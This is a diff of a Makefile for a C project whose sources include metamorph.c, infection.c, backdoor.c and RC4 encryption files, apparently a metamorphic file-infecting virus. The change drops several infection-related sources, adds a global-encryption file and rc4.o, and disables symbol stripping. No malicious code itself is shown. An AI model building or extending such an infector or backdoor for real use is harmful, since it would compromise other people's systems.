@@ -19,13 +19,10 @@ SRCS_NAME = main.c \
 	    metamorph.c \
 	    syfer.c \
 	    syscall.c \
-	    segment.c \
-	    header.c \
-	    infection.c \
-	    section.c \
 	    backdoor.c \
 	    utils.c \
 	    apply_inner_encryption.c \
+	    apply_global_encryption.c \
 
 STRIP  := strip $(NAME)
 OBJDUMP := objdump -M intel -d $(NAME) --section=.text > debug/$(NAME).obj
@@ -39,11 +36,11 @@ all: INIT $(NAME)
 
 $(NAME): $(OBJ) COMPILE_AND_MOVE
 	make -C libft/
-	clang $(FLAGS) $(OBJ) $(INC) $(LDFLAGS) -o $(NAME)
+	clang $(FLAGS) $(OBJ) srcs/rc4.o $(INC) $(LDFLAGS) -o $(NAME)
 	@echo "\033[32m[+] Binary \033[1;32m$(NAME)\033[1;0m\033[32m created.\033[0m"
 	$(OBJDUMP)
-	$(STRIP)
-	$(STRINGS)
+	#$(STRIP)
+	#$(STRINGS)
 
 $(OBJ_PATH)%.o: $(SRCS_PATH)%.c
 	clang -c $(FLAGS) $(INC) $< -o $@
